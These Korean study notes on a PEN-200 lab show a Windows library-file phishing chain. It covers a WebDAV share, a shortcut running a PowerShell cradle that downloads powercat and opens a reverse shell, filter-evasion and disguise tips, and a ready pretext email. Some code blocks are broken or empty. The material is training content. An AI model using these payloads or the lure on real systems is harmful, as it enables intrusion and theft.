# 12.3.1 Windows 라이브러리 파일을 통한 코드 실행 획득

> **Obtaining Code Execution via Windows Library Files** · PEN-200 §12.3.1

Windows 라이브러리 파일은 원격 위치(웹 서비스·공유)를 사용자에게 연결해 주는 가상 컨테이너임. 확장자는 `.Library-ms` 이고 탐색기에서 더블클릭하면 실행됨. 이 절의 공격은 2단계 구조임 — 1단계로 `.Library-ms` 를 피해자에게 보내 공격자의 WebDAV 공유를 탐색기에 붙이고, 2단계로 그 공유 안에 놓아둔 `.lnk` 바로가기를 더블클릭하게 해 PowerShell 리버스셸을 띄움.

왜 2단계로 도는가 — `.lnk` 를 Apache 로 직접 서빙하고 링크를 보내면, 스팸 필터와 보안 장비가 링크 안의 내용과 다운로드되는 실행 파일 형식을 검사해 피해자에게 닿기 전에 걸러냄. 반면 Windows 라이브러리 파일은 대체로 그대로 통과함. 게다가 피해자가 열면 원격 위치가 **로컬 디렉터리처럼** 표시돼, 사용자 입장에서는 자기 PC 의 파일을 더블클릭하는 것으로 보임.

WebDAV 서버로 WsgiDAV 를 씀. Kali 에서 `pip3` 로 설치함.

```

`externally-managed-environment` 오류로 실패하면 가상환경을 쓰거나 `apt` 로 `python3-wsgidav` 를 설치함. PEP 668 이 pip 설치가 OS 를 망가뜨리는 상황을 막으려고 가상환경 사용을 강제하게 바꿔서임. ⚠️ `apt` 로 설치했으면 설치 경로가 달라지고, 이후 교재 전체에서 실행 명령은 `wsgidav` 로 씀.

공유로 쓸 `/home/kali/webdav` 를 만들고 동작 확인용 `test.txt` 를 하나 넣은 뒤 기동함. `--host` 는 서빙할 호스트 — `0.0.0.0` 으로 전 인터페이스에서 수신함. `--port=80` 으로 포트를, `--auth=anonymous` 로 인증 해제를, `--root` 로 공유 루트를 지정함.

기동 로그가 `Serving on http://0.0.0.0:80` 을 찍으면 뜬 것이고, 브라우저로 `http://127.0.0.1` 을 열어 `test.txt` 가 보이는지로 확인함.

작성과 시험은 CLIENT137(`192.168.50.194`)에 `xfreerdp` 로 RDP 접속해서 함 — 계정은 `offsec` / `lab`. 바탕화면의 Visual Studio Code 로 빈 텍스트 파일을 만들어 `config.Library-ms` 로 저장함(메모장으로도 됨). 저장 즉시 아이콘이 붙는데, 이 아이콘은 Windows 에서 흔히 쓰이지 않아 오히려 의심을 사므로 뒤에서 `iconReference` 로 바꿔 위장함.

라이브러리 파일은 XML 이고 크게 세 부분 — 일반 정보, 라이브러리 속성, 라이브러리 위치. 각 태그의 의미는 이렇게 갈림.

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
</libraryDescription>
```

*최상위 골격 — 이하 모든 태그는 `libraryDescription` 안에 들어감*

- **`libraryDescription` 네임스페이스** — `.../windows/2009/library` 는 Windows 7 이후의 라이브러리 포맷 버전임. 이하 모든 태그는 이 태그 안에 들어감
- **`name`** — 임의 문자열이 아니라 **DLL 이름과 인덱스**로 지정해야 함. `@shell32.dll,-34575` 와 `@windows.storage.dll,-34582` 중 후자를 쓰는 이유는 텍스트 기반 필터가 "shell32" 문자열에 반응할 수 있어서임
- **`version`** — 임의 숫자, 예시는 `6`
- **`isLibraryPinned`** — 탐색기 탐색창에 고정할지 여부. `true` 로 두면 더 그럴듯해 보임
- **`iconReference`** — 표시 아이콘. `name` 과 같은 형식으로 지정하며 `imageres.dll` 에서 고름. `-1002` 는 문서 폴더, `-1003` 은 사진 폴더 아이콘이고 후자가 더 무해해 보임
- **`templateInfo` / `folderType`** — 열었을 때 탐색기가 기본으로 보여줄 열과 세부 정보. Microsoft 문서에서 찾은 GUID 를 넣으며 예시는 Documents 용 GUID
- **`searchConnectorDescriptionList` / `searchConnectorDescription`** — 위치 구역의 시작. 검색 커넥터가 원격 위치의 연결 설정을 담당하며 여러 개를 넣을 수 있으나 여기선 하나만 씀
- **`isDefaultSaveLocation`** — 사용자가 항목을 저장할 때 탐색기의 동작. 기본 동작·위치를 쓰려고 `true`
- **`isSupported`** — Microsoft 문서에 없는 호환성용 태그. `false` 로 둠
- **`url`** — 가장 중요한 태그. 앞서 띄운 WebDAV 공유를 HTTP 로 가리킴. `locationProvider` 대신 `simpleLocation` 안에 넣어 더 간단하게 지정함

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

저장 후 바탕화면에서 더블클릭하면 탐색기에 WebDAV 공유의 `test.txt` 가 뜸 — 연결이 박혔다는 뜻임. 덤으로 주소 표시줄에는 `config` 만 나오고 원격 위치라는 표시가 전혀 없어서, 1단계 미끼로 쓰기에 좋음.

⚠️ **한 번 실행하면 파일이 스스로 바뀜 — 이게 이 기법의 함정임.** 실행 후 다시 열어 보면 `serialized` 태그가 새로 생겨 위치 정보가 base64 로 들어가 있고, `url` 값도 `http://192.168.119.2` 에서 `\\192.168.119.2\DavWWWRoot` 로 바뀌어 있음. Windows 가 자체 WebDAV 클라이언트에 맞춰 연결 정보를 최적화하기 때문임. 그 상태의 파일은 **다른 머신이나 재부팅 뒤에는 동작하지 않을 수 있고**, 그러면 피해자 화면에 빈 공유가 떠 공격이 조용히 실패함. 전달 전에 위 XML 원문을 다시 붙여넣어 원상 복구할 것. 실행할 때마다 반복해야 하지만 실무에서는 피해자가 한 번만 더블클릭하면 되므로 부담은 아님.

*실행 후 스스로 바뀐 `config.Library-ms` — `serialized` 태그가 붙고 `url` 이 UNC 경로로 변형됨*

공유 안에 놓을 `.lnk` 를 만듦. `offsec` 바탕화면에서 우클릭 > New > Shortcut 을 고르고, 대상 경로 입력란에 PowerShell 다운로드 크래들을 넣어 Kali 에서 PowerCat 을 받아 리버스셸을 띄우게 함.

```
powershell.exe -c "IEX(New-Object
System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"
```

![[PEN200-Fig-219.png]]

*바로가기 대상 입력란에 다운로드 크래들을 넣는 화면*

이름은 `automatic_configuration` 으로 지음. 피해자가 바로가기의 대상 경로를 확인할 만큼 눈치가 있다고 보면, 명령 뒤에 구분자와 무해한 명령을 덧붙여 악성 명령을 속성창의 보이는 영역 밖으로 밀어내는 수법을 쓸 수 있음 — 확인해도 무해한 쪽만 보임.

PowerCat 자체는 WebDAV 공유가 아니라 **별도의 python3 웹 서버(8000 포트)로 제공함.** WebDAV 공유가 쓰기 가능이라 AV·보안 솔루션이 페이로드를 지우거나 격리할 수 있고, 그렇다고 공유를 읽기 전용으로 돌리면 대상 시스템에서 파일을 빼내는 좋은 경로를 잃기 때문임. 이 교재는 라이브러리 파일 공격에서 항상 이 구성을 씀.

바로가기가 실제로 도는지는 전달 전에 CLIENT137 바탕화면에서 직접 더블클릭해 확인함 — 실행 확인 창을 승인하면 리스너에 셸이 들어옴.

```
kali@kali:~$ nc -nvlp 4444

connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768
Windows PowerShell

*전달 전 자체 시험 — CLIENT137(`192.168.50.194`)에서 올라온 셸*

마무리로 HR137(`192.168.50.195`)에서 셸을 받음. 이 공격에서는 **프리텍스트가 핵심 요소임** — 예시는 "새로 온 IT 팀원인데 지난주 배포한 설정을 마무리해야 한다, 자동으로 처리해 주는 프로그램을 첨부했으니 열어서 `automatic_configuration` 을 더블클릭해 달라"는 메일임. 즉 피해자가 해야 할 일은 라이브러리 파일로 공유를 붙이고 그 안의 바로가기를 실행하는 것 두 가지고, 메일 문구가 그 두 동작을 자연스럽게 지시하도록 짜여 있음.

```
Hello! My name is Dwight, and I'm a new member of the IT Team.
This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!
If you have any questions, or run into any problems, please let me
know!
```

*교재가 제시하는 프리텍스트 메일 본문 예시*

Kali 쪽에서 `automatic_configuration.lnk` 와 `config.Library-ms` 를 WebDAV 디렉터리로 옮김(라이브러리 파일로 붙인 공유에 그대로 복사하면 편함). 실제 평가라면 라이브러리 파일은 메일로 보내겠지만, 여기서는 전달 단계를 `\\192.168.50.195\share` SMB 공유로 대신함. 확인용으로 넣어 둔 `test.txt` 는 지움. `smbclient` 의 `-c` 로 `put` 을 지정해 업로드하되, **실행 전에 라이브러리 파일이 있는 디렉터리로 이동해야 함.**

```
kali@kali:~$ cd webdav
kali@kali:~/webdav$ cd webdav
kali@kali:~/webdav$ rm test.txt
kali@kali:~/webdav$ smbclient //192.168.50.195/share -c 'put config.Library-ms'
Enter WORKGROUP\kali's password:
putting file config.Library-ms as \config.Library-ms (1.8 kb/s) (average 1.8 kb/s)
```

이 시점에 Kali 에서 세 가지가 동시에 떠 있어야 함 — `powercat.ps1` 을 서빙하는 python3 웹 서버(8000), WebDAV 공유용 WsgiDAV(80), 그리고 Netcat 리스너(4444). 시뮬레이션된 사용자가 라이브러리 파일을 열고 바로가기를 실행하면 셸이 들어옴.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.195] 56839
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
hr137\hsmith
```

이 기법은 앞서 다룬 Office 매크로 공격이나 다른 클라이언트 사이드 공격과 조합할 수도 있음. 요점은 Windows 라이브러리 파일이 **2단계 페이로드를 스팸 필터 같은 보안 기술에 노출시키지 않고 전달하는 1단계**로 쓸모가 있다는 것임.
